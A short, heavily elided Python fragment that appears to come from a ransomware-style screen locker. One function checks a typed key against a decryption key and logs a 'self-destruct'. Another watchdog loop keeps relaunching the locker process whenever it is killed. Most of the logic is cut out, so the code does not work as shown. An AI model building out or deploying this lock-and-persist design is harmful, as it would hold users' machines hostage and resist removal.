...
def show_lock_bar(decryption_key):
    def check_key():
        ...
        if user_key == decryption_key:
            ...
            logging.info("Script self-destructed after decryption.")
        else:
...
def monitor_and_restart(exe_path, process_name, decryption_key):
    ...
    def auto_restart_process(exe_path):
        ...
        print(f"Started process {exe_path} with PID {process.pid}")
        return process
    ...
    try:
        while True:
            if not is_process_running(process_name):
                print(f"Process {process_name} terminated. Restarting...")
                process = auto_restart_process(exe_path)
